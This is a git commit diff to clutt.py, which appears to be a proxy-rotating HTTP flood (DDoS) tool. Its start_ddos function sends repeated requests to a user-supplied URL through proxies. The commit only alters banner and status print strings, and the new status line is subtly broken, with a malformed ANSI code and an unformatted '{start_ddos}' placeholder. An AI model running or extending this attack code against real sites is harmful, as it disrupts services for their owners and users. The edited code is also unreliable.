1c0287f85e55d812bf3c43765a7f7836ce068aa1
s3cr3tmod-xp <s3cr3tmod@gmail.com>
2026-07-21 10:52:45 +0700

    Update clutt.py

--- clutt.py
+++ clutt.py
@@ -84,7 +84,7 @@ def start_ddos(prox, url, headers, proxies, color):
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+ "disturb-proxy:  {}".format(prox))
-			print("\033[104m\033[37m\033[3mServer gate :>\033[0m  \033[38;5;220m\033[3m"+str(url)+"\033[0m")
+			print("\033[104m\033[37m\033[3mThread :>\033[0m  \033[38;5;220m\033[3{start_ddos}\033[0m")
 			
 	except:
 		pass
@@ -94,7 +94,7 @@ def start_ddos(prox, url, headers, proxies, color):
 @click.option('--url', '-u', help="URL")
 def main(proxy, url):
 	if url == None:
-		print("\033[38;5;220m┌[KunFayz————]😁🤣\033[0m")
+		print("\033[38;5;220m┌[KunFayz————]☑️\033[0m")
 		url = input("\033[38;5;220m└>••URL: \033[97m")
 	if url[:4] != "http":
 		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
